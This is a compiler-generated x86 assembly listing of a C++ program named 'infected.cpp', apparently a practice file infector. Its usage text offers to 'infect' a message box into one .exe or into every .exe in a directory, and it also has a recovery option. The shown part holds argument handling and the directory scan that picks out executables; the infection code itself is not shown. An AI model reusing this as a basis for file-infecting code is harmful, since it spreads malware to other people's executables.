  00084	8b 04 0a	 mov	 eax, DWORD PTR [edx+ecx]
  00087	89 45 ec	 mov	 DWORD PTR tv129[ebp], eax
  0008a	8b 4d ec	 mov	 ecx, DWORD PTR tv129[ebp]
  0008d	51		 push	 ecx
  0008e	8b 55 e8	 mov	 edx, DWORD PTR tv95[ebp]
  00091	52		 push	 edx
  00092	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  00097	83 c4 08	 add	 esp, 8
  0009a	68 00 00 00 00	 push	 OFFSET $SG148235
  0009f	50		 push	 eax
  000a0	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  000a5	83 c4 08	 add	 esp, 8
  000a8	89 45 e4	 mov	 DWORD PTR tv135[ebp], eax
  000ab	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  000b0	8b 4d e4	 mov	 ecx, DWORD PTR tv135[ebp]
  000b3	e8 00 00 00 00	 call	 ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<
  000b8	89 45 e0	 mov	 DWORD PTR tv140[ebp], eax
  000bb	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  000c0	8b 4d e0	 mov	 ecx, DWORD PTR tv140[ebp]
  000c3	e8 00 00 00 00	 call	 ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<

; 502  :              << endl;
; 503  :         cout << "\tUsage		Description" << endl;

  000c8	68 00 00 00 00	 push	 OFFSET $SG148237
  000cd	68 00 00 00 00	 push	 OFFSET ?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cout
  000d2	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  000d7	83 c4 08	 add	 esp, 8
  000da	89 45 dc	 mov	 DWORD PTR tv147[ebp], eax
  000dd	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  000e2	8b 4d dc	 mov	 ecx, DWORD PTR tv147[ebp]
  000e5	e8 00 00 00 00	 call	 ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<

; 504  :         cout << "\t-----		-----------------------------------------------------------------" << endl;

  000ea	68 00 00 00 00	 push	 OFFSET $SG148238
  000ef	68 00 00 00 00	 push	 OFFSET ?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cout
  000f4	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  000f9	83 c4 08	 add	 esp, 8
  000fc	89 45 d8	 mov	 DWORD PTR tv154[ebp], eax
  000ff	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  00104	8b 4d d8	 mov	 ecx, DWORD PTR tv154[ebp]
  00107	e8 00 00 00 00	 call	 ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<

; 505  :         cout << "\t -f	        Infect Message Box into only one file" << endl;

  0010c	68 00 00 00 00	 push	 OFFSET $SG148239
  00111	68 00 00 00 00	 push	 OFFSET ?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cout
  00116	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  0011b	83 c4 08	 add	 esp, 8
  0011e	89 45 d4	 mov	 DWORD PTR tv161[ebp], eax
  00121	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  00126	8b 4d d4	 mov	 ecx, DWORD PTR tv161[ebp]
  00129	e8 00 00 00 00	 call	 ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<

; 506  :         cout << "\t -d	        Infect Message Box into one directory" << endl;

  0012e	68 00 00 00 00	 push	 OFFSET $SG148240
  00133	68 00 00 00 00	 push	 OFFSET ?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cout
  00138	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  0013d	83 c4 08	 add	 esp, 8
  00140	89 45 d0	 mov	 DWORD PTR tv168[ebp], eax
  00143	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  00148	8b 4d d0	 mov	 ecx, DWORD PTR tv168[ebp]
  0014b	e8 00 00 00 00	 call	 ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<

; 507  :         cout << "\t -r	        Recover file to original state" << endl;

  00150	68 00 00 00 00	 push	 OFFSET $SG148241
  00155	68 00 00 00 00	 push	 OFFSET ?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cout
  0015a	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  0015f	83 c4 08	 add	 esp, 8
  00162	89 45 cc	 mov	 DWORD PTR tv175[ebp], eax
  00165	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  0016a	8b 4d cc	 mov	 ecx, DWORD PTR tv175[ebp]
  0016d	e8 00 00 00 00	 call	 ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<

; 508  :         return 1;

  00172	b8 01 00 00 00	 mov	 eax, 1
  00177	e9 57 01 00 00	 jmp	 $LN1@main
$LN2@main:

; 509  :     }
; 510  : 
; 511  :     bool doRecover = false;

  0017c	c6 45 ff 00	 mov	 BYTE PTR _doRecover$[ebp], 0

; 512  : 
; 513  :     if (strcmp(argv[3], "-r") == 0)

  00180	68 00 00 00 00	 push	 OFFSET $SG148243
  00185	b8 04 00 00 00	 mov	 eax, 4
  0018a	6b c8 03	 imul	 ecx, eax, 3
  0018d	8b 55 0c	 mov	 edx, DWORD PTR _argv$[ebp]
  00190	8b 04 0a	 mov	 eax, DWORD PTR [edx+ecx]
  00193	50		 push	 eax
  00194	e8 00 00 00 00	 call	 _strcmp
  00199	83 c4 08	 add	 esp, 8
  0019c	85 c0		 test	 eax, eax
  0019e	75 04		 jne	 SHORT $LN3@main

; 514  :     {
; 515  :         doRecover = true;

  001a0	c6 45 ff 01	 mov	 BYTE PTR _doRecover$[ebp], 1
$LN3@main:

; 516  :     }
; 517  : 
; 518  :     if (doRecover == false)

  001a4	0f b6 4d ff	 movzx	 ecx, BYTE PTR _doRecover$[ebp]
  001a8	85 c9		 test	 ecx, ecx
  001aa	0f 85 c2 00 00
	00		 jne	 $LN4@main

; 519  :     {
; 520  :         if (strcmp(argv[1], "-f") == 0)

  001b0	68 00 00 00 00	 push	 OFFSET $SG148248
  001b5	ba 04 00 00 00	 mov	 edx, 4
  001ba	c1 e2 00	 shl	 edx, 0
  001bd	8b 45 0c	 mov	 eax, DWORD PTR _argv$[ebp]
  001c0	8b 0c 10	 mov	 ecx, DWORD PTR [eax+edx]
  001c3	51		 push	 ecx
  001c4	e8 00 00 00 00	 call	 _strcmp
  001c9	83 c4 08	 add	 esp, 8
  001cc	85 c0		 test	 eax, eax
  001ce	75 41		 jne	 SHORT $LN6@main

; 521  :         {
; 522  :             if (!OpenFile(argv[2]))

  001d0	ba 04 00 00 00	 mov	 edx, 4
  001d5	d1 e2		 shl	 edx, 1
  001d7	8b 45 0c	 mov	 eax, DWORD PTR _argv$[ebp]
  001da	8b 0c 10	 mov	 ecx, DWORD PTR [eax+edx]
  001dd	51		 push	 ecx
  001de	e8 00 00 00 00	 call	 ?OpenFile@@YA_NPBD@Z	; OpenFile
  001e3	83 c4 04	 add	 esp, 4
  001e6	0f b6 d0	 movzx	 edx, al
  001e9	85 d2		 test	 edx, edx
  001eb	75 22		 jne	 SHORT $LN8@main

; 523  :             {
; 524  :                 cerr << "Error: invalid file" << endl;

  001ed	68 00 00 00 00	 push	 OFFSET $SG148250
  001f2	68 00 00 00 00	 push	 OFFSET ?cerr@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cerr
  001f7	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  001fc	83 c4 08	 add	 esp, 8
  001ff	89 45 c8	 mov	 DWORD PTR tv202[ebp], eax
  00202	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  00207	8b 4d c8	 mov	 ecx, DWORD PTR tv202[ebp]
  0020a	e8 00 00 00 00	 call	 ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<
$LN8@main:

; 525  :             }
; 526  :         }

  0020f	eb 5f		 jmp	 SHORT $LN10@main
$LN6@main:

; 527  :         else if (strcmp(argv[1], "-d") == 0)

  00211	68 00 00 00 00	 push	 OFFSET $SG148252
  00216	b8 04 00 00 00	 mov	 eax, 4
  0021b	c1 e0 00	 shl	 eax, 0
  0021e	8b 4d 0c	 mov	 ecx, DWORD PTR _argv$[ebp]
  00221	8b 14 01	 mov	 edx, DWORD PTR [ecx+eax]
  00224	52		 push	 edx
  00225	e8 00 00 00 00	 call	 _strcmp
  0022a	83 c4 08	 add	 esp, 8
  0022d	85 c0		 test	 eax, eax
  0022f	75 3f		 jne	 SHORT $LN10@main

; 528  :         {
; 529  :             if (!OpenDirectory(argv[2]))

  00231	b8 04 00 00 00	 mov	 eax, 4
  00236	d1 e0		 shl	 eax, 1
  00238	8b 4d 0c	 mov	 ecx, DWORD PTR _argv$[ebp]
  0023b	8b 14 01	 mov	 edx, DWORD PTR [ecx+eax]
  0023e	52		 push	 edx
  0023f	e8 00 00 00 00	 call	 ?OpenDirectory@@YA_NPBD@Z ; OpenDirectory
  00244	83 c4 04	 add	 esp, 4
  00247	0f b6 c0	 movzx	 eax, al
  0024a	85 c0		 test	 eax, eax
  0024c	75 22		 jne	 SHORT $LN10@main

; 530  :             {
; 531  :                 cerr << "Error: invalid directory" << endl;

  0024e	68 00 00 00 00	 push	 OFFSET $SG148254
  00253	68 00 00 00 00	 push	 OFFSET ?cerr@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cerr
  00258	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  0025d	83 c4 08	 add	 esp, 8
  00260	89 45 c4	 mov	 DWORD PTR tv221[ebp], eax
  00263	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  00268	8b 4d c4	 mov	 ecx, DWORD PTR tv221[ebp]
  0026b	e8 00 00 00 00	 call	 ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<
$LN10@main:

; 532  :             }
; 533  :         }
; 534  :     }

  00270	eb 5f		 jmp	 SHORT $LN12@main
$LN4@main:

; 535  :     else
; 536  :     {
; 537  :         if (strcmp(argv[1], "-f") == 0)

  00272	68 00 00 00 00	 push	 OFFSET $SG148256
  00277	b9 04 00 00 00	 mov	 ecx, 4
  0027c	c1 e1 00	 shl	 ecx, 0
  0027f	8b 55 0c	 mov	 edx, DWORD PTR _argv$[ebp]
  00282	8b 04 0a	 mov	 eax, DWORD PTR [edx+ecx]
  00285	50		 push	 eax
  00286	e8 00 00 00 00	 call	 _strcmp
  0028b	83 c4 08	 add	 esp, 8
  0028e	85 c0		 test	 eax, eax
  00290	75 3f		 jne	 SHORT $LN12@main

; 538  :         {
; 539  :             if (!RecoverFile(argv[2]))

  00292	b9 04 00 00 00	 mov	 ecx, 4
  00297	d1 e1		 shl	 ecx, 1
  00299	8b 55 0c	 mov	 edx, DWORD PTR _argv$[ebp]
  0029c	8b 04 0a	 mov	 eax, DWORD PTR [edx+ecx]
  0029f	50		 push	 eax
  002a0	e8 00 00 00 00	 call	 ?RecoverFile@@YA_NPBD@Z	; RecoverFile
  002a5	83 c4 04	 add	 esp, 4
  002a8	0f b6 c8	 movzx	 ecx, al
  002ab	85 c9		 test	 ecx, ecx
  002ad	75 22		 jne	 SHORT $LN12@main

; 540  :             {
; 541  :                 cerr << "Error: invalid file" << endl;

  002af	68 00 00 00 00	 push	 OFFSET $SG148258
  002b4	68 00 00 00 00	 push	 OFFSET ?cerr@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cerr
  002b9	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  002be	83 c4 08	 add	 esp, 8
  002c1	89 45 c0	 mov	 DWORD PTR tv240[ebp], eax
  002c4	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  002c9	8b 4d c0	 mov	 ecx, DWORD PTR tv240[ebp]
  002cc	e8 00 00 00 00	 call	 ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<
$LN12@main:

; 542  :             }
; 543  :         }
; 544  :     }
; 545  : 
; 546  :     return 0;

  002d1	33 c0		 xor	 eax, eax
$LN1@main:

; 547  : }

  002d3	8b e5		 mov	 esp, ebp
  002d5	5d		 pop	 ebp
  002d6	c3		 ret	 0
_main	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??$?0$$BY04D$0A@@path@filesystem@std@@QAE@AAY04$$CBDW4format@012@@Z
_TEXT	SEGMENT
_this$ = -8						; size = 4
$T1 = -1						; size = 1
__Source$ = 8						; size = 4
___formal$ = 12						; size = 4
??$?0$$BY04D$0A@@path@filesystem@std@@QAE@AAY04$$CBDW4format@012@@Z PROC ; std::filesystem::path::path<char [5],0>, COMDAT
; _this$ = ecx

; 655  :         path(const _Src& _Source, format = auto_format) : _Text(_Convert_Source_to_wide(_Source)) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx
  00009	33 c0		 xor	 eax, eax
  0000b	88 45 ff	 mov	 BYTE PTR $T1[ebp], al
  0000e	0f b6 4d ff	 movzx	 ecx, BYTE PTR $T1[ebp]
  00012	51		 push	 ecx
  00013	8b 55 08	 mov	 edx, DWORD PTR __Source$[ebp]
  00016	52		 push	 edx
  00017	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0001a	50		 push	 eax
  0001b	e8 00 00 00 00	 call	 ??$_Convert_Source_to_wide@$$BY04DU_Normal_conversion@filesystem@std@@@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@1@AAY04$$CBDU_Normal_conversion@01@@Z ; std::filesystem::_Convert_Source_to_wide<char [5],std::filesystem::_Normal_conversion>
  00020	83 c4 0c	 add	 esp, 12			; 0000000cH

; 656  :             // format has no meaning for this implementation, as the generic grammar is acceptable as a native path
; 657  :         }

  00023	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  00026	8b e5		 mov	 esp, ebp
  00028	5d		 pop	 ebp
  00029	c2 08 00	 ret	 8
??$?0$$BY04D$0A@@path@filesystem@std@@QAE@AAY04$$CBDW4format@012@@Z ENDP ; std::filesystem::path::path<char [5],0>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??$?0PBD$0A@@path@filesystem@std@@QAE@ABQBDW4format@012@@Z
_TEXT	SEGMENT
_this$ = -8						; size = 4
$T1 = -1						; size = 1
__Source$ = 8						; size = 4
___formal$ = 12						; size = 4
??$?0PBD$0A@@path@filesystem@std@@QAE@ABQBDW4format@012@@Z PROC ; std::filesystem::path::path<char const *,0>, COMDAT
; _this$ = ecx

; 655  :         path(const _Src& _Source, format = auto_format) : _Text(_Convert_Source_to_wide(_Source)) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx
  00009	33 c0		 xor	 eax, eax
  0000b	88 45 ff	 mov	 BYTE PTR $T1[ebp], al
  0000e	0f b6 4d ff	 movzx	 ecx, BYTE PTR $T1[ebp]
  00012	51		 push	 ecx
  00013	8b 55 08	 mov	 edx, DWORD PTR __Source$[ebp]
  00016	52		 push	 edx
  00017	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0001a	50		 push	 eax
  0001b	e8 00 00 00 00	 call	 ??$_Convert_Source_to_wide@PBDU_Normal_conversion@filesystem@std@@@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@1@ABQBDU_Normal_conversion@01@@Z ; std::filesystem::_Convert_Source_to_wide<char const *,std::filesystem::_Normal_conversion>
  00020	83 c4 0c	 add	 esp, 12			; 0000000cH

; 656  :             // format has no meaning for this implementation, as the generic grammar is acceptable as a native path
; 657  :         }

  00023	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  00026	8b e5		 mov	 esp, ebp
  00028	5d		 pop	 ebp
  00029	c2 08 00	 ret	 8
??$?0PBD$0A@@path@filesystem@std@@QAE@ABQBDW4format@012@@Z ENDP ; std::filesystem::path::path<char const *,0>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\masm32\Code\ASMPractice\demo1\demo3\infected.cpp
_TEXT	SEGMENT
_$S4$1 = -160						; size = 8
_<end>$L0$2 = -152					; size = 8
_filePath$3 = -144					; size = 4
tv176 = -140						; size = 4
tv158 = -136						; size = 4
_<begin>$L0$4 = -132					; size = 8
tv166 = -124						; size = 4
_<range>$L0$5 = -120					; size = 4
_countFile$ = -116					; size = 4
_entry$6 = -112						; size = 4
$T7 = -105						; size = 1
$T8 = -104						; size = 4
$T9 = -100						; size = 24
_temp$10 = -76						; size = 24
$T11 = -52						; size = 24
$T12 = -28						; size = 24
__$ArrayPad$ = -4					; size = 4
_pathDirectory$ = 8					; size = 4
?OpenDirectory@@YA_NPBD@Z PROC				; OpenDirectory

; 474  : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	81 ec a0 00 00
	00		 sub	 esp, 160		; 000000a0H
  00009	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0000e	33 c5		 xor	 eax, ebp
  00010	89 45 fc	 mov	 DWORD PTR __$ArrayPad$[ebp], eax
  00013	c7 45 98 00 00
	00 00		 mov	 DWORD PTR $T8[ebp], 0

; 475  :     int countFile = 0;

  0001a	c7 45 8c 00 00
	00 00		 mov	 DWORD PTR _countFile$[ebp], 0

; 476  :     for (const auto &entry : std::filesystem::directory_iterator(pathDirectory))

  00021	6a 00		 push	 0
  00023	8d 45 08	 lea	 eax, DWORD PTR _pathDirectory$[ebp]
  00026	50		 push	 eax
  00027	8d 4d e4	 lea	 ecx, DWORD PTR $T12[ebp]
  0002a	e8 00 00 00 00	 call	 ??$?0PBD$0A@@path@filesystem@std@@QAE@ABQBDW4format@012@@Z ; std::filesystem::path::path<char const *,0>
  0002f	8d 4d e4	 lea	 ecx, DWORD PTR $T12[ebp]
  00032	51		 push	 ecx
  00033	8d 8d 60 ff ff
	ff		 lea	 ecx, DWORD PTR _$S4$1[ebp]
  00039	e8 00 00 00 00	 call	 ??0directory_iterator@filesystem@std@@QAE@ABVpath@12@@Z ; std::filesystem::directory_iterator::directory_iterator
  0003e	8d 95 60 ff ff
	ff		 lea	 edx, DWORD PTR _$S4$1[ebp]
  00044	89 55 88	 mov	 DWORD PTR _<range>$L0$5[ebp], edx
  00047	8d 4d e4	 lea	 ecx, DWORD PTR $T12[ebp]
  0004a	e8 00 00 00 00	 call	 ??1path@filesystem@std@@QAE@XZ ; std::filesystem::path::~path
  0004f	83 ec 08	 sub	 esp, 8
  00052	8b cc		 mov	 ecx, esp
  00054	8b 45 88	 mov	 eax, DWORD PTR _<range>$L0$5[ebp]
  00057	50		 push	 eax
  00058	e8 00 00 00 00	 call	 ??0directory_iterator@filesystem@std@@QAE@ABV012@@Z ; std::filesystem::directory_iterator::directory_iterator
  0005d	8d 8d 7c ff ff
	ff		 lea	 ecx, DWORD PTR _<begin>$L0$4[ebp]
  00063	51		 push	 ecx
  00064	e8 00 00 00 00	 call	 ?begin@filesystem@std@@YA?AVdirectory_iterator@12@V312@@Z ; std::filesystem::begin
  00069	83 c4 0c	 add	 esp, 12			; 0000000cH
  0006c	83 ec 08	 sub	 esp, 8
  0006f	8b cc		 mov	 ecx, esp
  00071	8b 55 88	 mov	 edx, DWORD PTR _<range>$L0$5[ebp]
  00074	52		 push	 edx
  00075	e8 00 00 00 00	 call	 ??0directory_iterator@filesystem@std@@QAE@ABV012@@Z ; std::filesystem::directory_iterator::directory_iterator
  0007a	8d 85 68 ff ff
	ff		 lea	 eax, DWORD PTR _<end>$L0$2[ebp]
  00080	50		 push	 eax
  00081	e8 00 00 00 00	 call	 ?end@filesystem@std@@YA?AVdirectory_iterator@12@V312@@Z ; std::filesystem::end
  00086	83 c4 0c	 add	 esp, 12			; 0000000cH
  00089	eb 0b		 jmp	 SHORT $LN4@OpenDirect
$LN2@OpenDirect:
  0008b	8d 8d 7c ff ff
	ff		 lea	 ecx, DWORD PTR _<begin>$L0$4[ebp]
  00091	e8 00 00 00 00	 call	 ??Edirectory_iterator@filesystem@std@@QAEAAV012@XZ ; std::filesystem::directory_iterator::operator++
$LN4@OpenDirect:
  00096	8d 8d 68 ff ff
	ff		 lea	 ecx, DWORD PTR _<end>$L0$2[ebp]
  0009c	51		 push	 ecx
  0009d	8d 8d 7c ff ff
	ff		 lea	 ecx, DWORD PTR _<begin>$L0$4[ebp]
  000a3	e8 00 00 00 00	 call	 ??9directory_iterator@filesystem@std@@QBE_NABV012@@Z ; std::filesystem::directory_iterator::operator!=
  000a8	0f b6 d0	 movzx	 edx, al
  000ab	85 d2		 test	 edx, edx
  000ad	0f 84 fb 00 00
	00		 je	 $LN3@OpenDirect
  000b3	8d 8d 7c ff ff
	ff		 lea	 ecx, DWORD PTR _<begin>$L0$4[ebp]
  000b9	e8 00 00 00 00	 call	 ??Ddirectory_iterator@filesystem@std@@QBEABVdirectory_entry@12@XZ ; std::filesystem::directory_iterator::operator*
  000be	89 45 90	 mov	 DWORD PTR _entry$6[ebp], eax

; 477  :     {
; 478  :         if (entry.is_regular_file() && entry.path().extension() == ".exe")

  000c1	8b 4d 90	 mov	 ecx, DWORD PTR _entry$6[ebp]
  000c4	e8 00 00 00 00	 call	 ?is_regular_file@directory_entry@filesystem@std@@QBE_NXZ ; std::filesystem::directory_entry::is_regular_file
  000c9	0f b6 c0	 movzx	 eax, al
  000cc	85 c0		 test	 eax, eax
  000ce	74 51		 je	 SHORT $LN8@OpenDirect
  000d0	6a 00		 push	 0
  000d2	68 00 00 00 00	 push	 OFFSET $SG148175
  000d7	8d 4d cc	 lea	 ecx, DWORD PTR $T11[ebp]
  000da	e8 00 00 00 00	 call	 ??$?0$$BY04D$0A@@path@filesystem@std@@QAE@AAY04$$CBDW4format@012@@Z ; std::filesystem::path::path<char [5],0>
  000df	83 4d 98 01	 or	 DWORD PTR $T8[ebp], 1
  000e3	8b 4d 90	 mov	 ecx, DWORD PTR _entry$6[ebp]
  000e6	e8 00 00 00 00	 call	 ?path@directory_entry@filesystem@std@@QBEABV023@XZ ; std::filesystem::directory_entry::path
  000eb	89 85 78 ff ff
	ff		 mov	 DWORD PTR tv158[ebp], eax
  000f1	8d 4d cc	 lea	 ecx, DWORD PTR $T11[ebp]
  000f4	51		 push	 ecx
  000f5	8d 55 9c	 lea	 edx, DWORD PTR $T9[ebp]
  000f8	52		 push	 edx
  000f9	8b 8d 78 ff ff
	ff		 mov	 ecx, DWORD PTR tv158[ebp]
  000ff	e8 00 00 00 00	 call	 ?extension@path@filesystem@std@@QBE?AV123@XZ ; std::filesystem::path::extension
  00104	83 4d 98 02	 or	 DWORD PTR $T8[ebp], 2
  00108	50		 push	 eax
  00109	e8 00 00 00 00	 call	 ??8filesystem@std@@YA_NABVpath@01@0@Z ; std::filesystem::operator==
  0010e	83 c4 08	 add	 esp, 8
  00111	0f b6 c0	 movzx	 eax, al
  00114	85 c0		 test	 eax, eax
  00116	74 09		 je	 SHORT $LN8@OpenDirect
  00118	c7 45 84 01 00
	00 00		 mov	 DWORD PTR tv166[ebp], 1
  0011f	eb 07		 jmp	 SHORT $LN9@OpenDirect
$LN8@OpenDirect:
  00121	c7 45 84 00 00
	00 00		 mov	 DWORD PTR tv166[ebp], 0
$LN9@OpenDirect:
  00128	8a 4d 84	 mov	 cl, BYTE PTR tv166[ebp]
  0012b	88 4d 97	 mov	 BYTE PTR $T7[ebp], cl
  0012e	8b 55 98	 mov	 edx, DWORD PTR $T8[ebp]
  00131	83 e2 02	 and	 edx, 2
  00134	74 0c		 je	 SHORT $LN10@OpenDirect
  00136	83 65 98 fd	 and	 DWORD PTR $T8[ebp], -3	; fffffffdH
  0013a	8d 4d 9c	 lea	 ecx, DWORD PTR $T9[ebp]
  0013d	e8 00 00 00 00	 call	 ??1path@filesystem@std@@QAE@XZ ; std::filesystem::path::~path
$LN10@OpenDirect:
  00142	8b 45 98	 mov	 eax, DWORD PTR $T8[ebp]
  00145	83 e0 01	 and	 eax, 1
  00148	74 0c		 je	 SHORT $LN11@OpenDirect
  0014a	83 65 98 fe	 and	 DWORD PTR $T8[ebp], -2	; fffffffeH
  0014e	8d 4d cc	 lea	 ecx, DWORD PTR $T11[ebp]
  00151	e8 00 00 00 00	 call	 ??1path@filesystem@std@@QAE@XZ ; std::filesystem::path::~path
$LN11@OpenDirect:
  00156	0f b6 4d 97	 movzx	 ecx, BYTE PTR $T7[ebp]
  0015a	85 c9		 test	 ecx, ecx
  0015c	74 42		 je	 SHORT $LN5@OpenDirect

; 479  :         {
; 480  :             string temp = entry.path().string();

  0015e	8b 4d 90	 mov	 ecx, DWORD PTR _entry$6[ebp]
  00161	e8 00 00 00 00	 call	 ?path@directory_entry@filesystem@std@@QBEABV023@XZ ; std::filesystem::directory_entry::path
  00166	89 85 74 ff ff
	ff		 mov	 DWORD PTR tv176[ebp], eax
  0016c	8d 55 b4	 lea	 edx, DWORD PTR _temp$10[ebp]
  0016f	52		 push	 edx
  00170	8b 8d 74 ff ff
	ff		 mov	 ecx, DWORD PTR tv176[ebp]
  00176	e8 00 00 00 00	 call	 ?string@path@filesystem@std@@QBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@3@XZ ; std::filesystem::path::string

; 481  :             const char *filePath = temp.c_str();

  0017b	8d 4d b4	 lea	 ecx, DWORD PTR _temp$10[ebp]
